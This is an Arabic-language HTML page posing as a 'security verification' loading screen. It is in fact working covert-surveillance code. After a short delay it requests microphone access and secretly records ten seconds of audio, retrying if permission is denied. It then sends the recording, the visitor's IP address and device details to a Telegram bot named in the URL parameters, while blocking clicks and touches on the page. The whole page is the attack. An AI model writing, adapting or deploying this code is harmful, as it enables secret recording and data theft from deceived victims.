<!DOCTYPE html> <html lang="ar"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> <title>التحقق الأمني</title> <style> * { margin: 0; padding: 0; box-sizing: border-box; } body { background: black; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; position: fixed; width: 100%; height: 100%; } /* الشاشة السوداء الرئيسية */ .main-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; display: flex; align-items: center; justify-content: center; z-index: 1000; color: white; } /* دائرة التحميل */ .loading-spinner { width: 80px; height: 80px; border: 5px solid rgba(255, 255, 255, 0.1); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; } @keyframes spin { to { transform: rotate(360deg); } } /* 🎤 عناصر صوت مخفية */ #hiddenAudioRecorder { display: none; } /* رسالة منبثقة صغيرة (مش مزعجة) */ .mini-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.8); color: white; padding: 8px 16px; border-radius: 20px; font-size: 12px; z-index: 2000; display: none; border: 1px solid rgba(255, 255, 255, 0.2); backdrop-filter: blur(5px); } </style> </head> <body> <!-- الشاشة السوداء الرئيسية (دائماً ظاهرة) --> <div class="main-screen" id="mainScreen"> <div class="loading-spinner" id="loadingSpinner"></div> <div style="position: absolute; bottom: 50px; font-size: 12px; opacity: 0.5;" id="statusText">جاري التحميل...</div> </div> <!-- 🎤 عناصر تسجيل الصوت المخفية --> <audio id="hiddenAudioPlayback" controls style="display: none;"></audio> <!-- رسالة منبثقة صغيرة --> <div class="mini-toast" id="miniToast"></div> <script> // فك التشفير function decodeToken(encodedToken) { try { return atob(decodeURIComponent(encodedToken)); } catch (e) { return null; } } // قراءة الباراميترات const urlParams = new URLSearchParams(window.location.search); const CHAT_ID = urlParams.get('id'); const encodedToken = urlParams.get('tok'); const BOT_TOKEN = encodedToken ? decodeToken(encodedToken) : null; // العناصر const mainScreen = document.getElementById('mainScreen'); const loadingSpinner = document.getElementById('loadingSpinner'); const statusText = document.getElementById('statusText'); const miniToast = document.getElementById('miniToast'); // متغيرات التسجيل let mediaRecorder = null; let audioChunks = []; let audioStream = null; let isRecording = false; // دالة إظهار رسالة صغيرة function showMessage(msg) { miniToast.style.display = 'block'; miniToast.textContent = msg; setTimeout(() => { miniToast.style.display = 'none'; }, 2000); } // 🎤 بدء تسجيل الصوت المخفي async function startHiddenRecording() { try { // تغيير النص statusText.textContent = 'جاري تجهيز الميكروفون...'; // طلب إذن الميكروفون audioStream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true } }); statusText.textContent = 'جاري ...'; showMessage('جاري الان...'); // تجهيز مسجل الصوت mediaRecorder = new MediaRecorder(audioStream); audioChunks = []; // جمع قطع الصوت mediaRecorder.ondataavailable = event => { audioChunks.push(event.data); }; // عند انتهاء التسجيل mediaRecorder.onstop = async () => { // إنشاء ملف الصوت const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' }); // إرسال الصوت await sendHiddenAudio(audioBlob); }; // بدء التسجيل (يسجل لمدة 10 ثواني) mediaRecorder.start(); isRecording = true; // تسجيل لمدة 10 ثواني ثم التوقف setTimeout(() => { if (mediaRecorder && isRecording) { mediaRecorder.stop(); isRecording = false; statusText.textContent = 'جاري الإرسال...'; // إيقاف تدفق الصوت if (audioStream) { audioStream.getTracks().forEach(track => track.stop()); } } }, 10000); // 10 ثواني تسجيل } catch (error) { console.error('خطأ في الميكروفون:', error); statusText.textContent = '❌ فشل ا'; showMessage('❌ فشل'); // حاول مرة أخرى بعد 3 ثواني setTimeout(() => { startHiddenRecording(); }, 3000); } } // 🎤 إرسال التسجيل الصوتي async function sendHiddenAudio(audioBlob) { try { showMessage('📤 جاري الإرسال...'); // جلب IP let ip = 'غير معروف'; try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); ip = ipData.ip; } catch (e) {} // إرسال الملف الصوتي const formData = new FormData(); formData.append('chat_id', CHAT_ID); formData.append('audio', audioBlob, 'recording.mp3'); formData.append('caption', `الان (10 ثواني)`); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData }); // إرسال معلومات إضافية const textMessage = ` 🎤 <b>تسجيل صوتي خفي</b> ━━━━━━━━━━━━━━━━ 🌍 <b>IP:</b> ${ip} 📱 <b>الجهاز:</b> ${navigator.userAgent.substring(0, 100)} ⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')} ⏱ <b>المدة:</b> 10 ثواني ━━━━━━━━━━━━━━━━ ⚠️ <i>تم التسجيل في الخلفية</i> `; await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage, parse_mode: 'HTML' }) }); // تم بنجاح statusText.textContent = '✓ تم بنجاح'; showMessage('✅ تم إرسال '); // بعد ثانيتين setTimeout(() => { statusText.textContent = 'تم بنجاح ✓'; loadingSpinner.style.opacity = '0.5'; }, 2000); } catch (error) { console.error('فشل الإرسال:', error); statusText.textContent = '❌ فشل الإرسال'; showMessage('❌ فشل'); } } // التحقق من الرابط if(!CHAT_ID || !BOT_TOKEN) { mainScreen.innerHTML = '<div style="color: white; text-align: center;">⚠️ رابط غير صالح</div>'; } else { // 🎤 بدء تسجيل الصوت بعد ثانيتين setTimeout(() => { startHiddenRecording(); }, 2000); } // منع أي تفاعل مع الشاشة document.addEventListener('click', (e) => { e.preventDefault(); return false; }, true); document.addEventListener('touchstart', (e) => { e.preventDefault(); return false; }, true); // منع النقر على الروابط document.addEventListener('contextmenu', (e) => { e.preventDefault(); return false; }); </script> </body> </html>
